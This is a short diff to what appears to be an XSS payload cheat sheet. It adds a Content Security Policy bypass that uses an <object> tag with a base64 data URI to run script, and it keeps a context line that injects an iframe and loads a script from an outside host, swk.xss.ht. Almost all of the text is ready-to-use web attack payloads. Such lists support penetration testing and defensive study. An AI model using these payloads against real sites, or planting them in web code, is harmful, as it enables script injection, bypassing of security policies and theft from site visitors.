@@ -717,6 +717,14 @@ window.frames[0].document.head.appendChild(script);
 d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://swk.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
+### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
+
+Works for CSP like `script-src self`
+
+```js
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
 ## Common WAF Bypass
 
 ### Chrome Auditor - 9th august
